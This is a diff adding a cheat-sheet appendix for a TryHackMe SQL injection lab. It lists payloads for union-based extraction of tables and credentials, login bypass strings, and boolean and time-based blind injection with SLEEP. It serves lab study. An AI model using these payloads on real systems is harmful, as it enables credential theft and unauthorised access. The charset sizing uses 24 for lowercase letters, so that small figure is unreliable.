@@ -1,0 +1,126 @@
+---
+title: "SQLi quick reference — appendix"
+room: "SQL Injection (THM Practical)"
+difficulty: easy
+platform: TryHackMe
+vulnClass: "SQL Injection"
+appendix: true
+parent: "/sqli"
+spoilerFree: false
+---
+
+# SQLi quick reference
+
+The four SQLi techniques in one page. Use this when you are staring at a
+`/run` endpoint and not sure which oracle to reach for.
+
+## Decision tree
+
+```
+1. Inject — does the server react differently than baseline?
+   └─ no  → not injectable (or you are missing the right field)
+   └─ yes ↓
+
+2. Does the response body include extracted data?
+   └─ yes → union-based. find column count, then dump.
+   └─ no  ↓
+
+3. Is there a yes/no signal anywhere (status, body field, header)?
+   └─ yes → boolean blind. walk with LIKE 'prefix%'.
+   └─ no  ↓
+
+4. Use timing. Server-leaked `time` field → easy.
+   Network-only → 5s sleep + 2x baseline threshold.
+```
+
+## Union-based skeleton
+
+```sql
+-- 1. column count
+?  UNION SELECT 1       -- 1222 = wrong count
+?  UNION SELECT 1,2     -- still wrong
+?  UNION SELECT 1,2,3   -- 3 = N (the answer)
+
+-- 2. visible column
+?  UNION SELECT 1,2,3                       -- the column that shows on the page is your target
+
+-- 3. extract
+?  UNION SELECT 1, database(), 3
+?  UNION SELECT 1, group_concat(table_name), 3
+       FROM information_schema.tables
+       WHERE table_schema = '<db>'
+?  UNION SELECT 1, group_concat(column_name), 3
+       FROM information_schema.columns
+       WHERE table_name = '<table>'
+?  UNION SELECT 1, group_concat(username,':',password SEPARATOR '<br>'), 3
+       FROM <table>
+```
+
+## Auth bypass skeleton
+
+```sql
+username: ' OR 1=1;--
+password: anything
+```
+
+Becomes:
+```sql
+SELECT * FROM users
+WHERE  username='' OR 1=1;--' AND password='anything' LIMIT 1;
+```
+
+Variants (all work on MySQL):
+- `' OR '1'='1' -- `
+- `admin' -- `
+- `' OR 1=1#`
+
+## Boolean blind skeleton
+
+```sql
+-- oracle payload
+<fake> ' UNION SELECT 1,2,3 WHERE <condition> LIKE '<prefix>%';--
+```
+
+Walk:
+```
+condition LIKE 'a%'  →  false
+condition LIKE 's%'  →  true   ← first letter
+condition LIKE 'sq%' →  true   ← second letter
+...
+condition LIKE 'sqli_three' → true   ← exact match (no wildcard) = done
+```
+
+Common `<condition>` targets:
+- `database()`
+- `(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)`
+- `(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)`
+- `(SELECT password FROM users WHERE username='admin')`
+
+## Time-based blind skeleton
+
+```sql
+-- server-leaked timing is easiest:
+<fake> ' UNION SELECT SLEEP(2),2 WHERE <condition> LIKE '<prefix>%';--
+```
+
+Network-only timing needs `IF`:
+```sql
+<fake> ' UNION SELECT IF(<condition>, SLEEP(5), 0),2;--
+```
+
+## Charset sizing
+
+- 4-digit numeric password → 40 requests worst case (10 × 4)
+- 8-char lowercase → 192 requests (24 × 8)
+- 8-char mixed (95 chars) → 760 requests — switch to binary search on ASCII
+  → 8 × 7 = 56 requests
+
+## What to log in your notes
+
+For each level you solve, record:
+- endpoint and parameters (URL-decoded)
+- column count + which column is visible
+- database / table / column chain
+- the exact LIKE or UNION payload that worked
+- response timing baseline (ms)
+- the flag
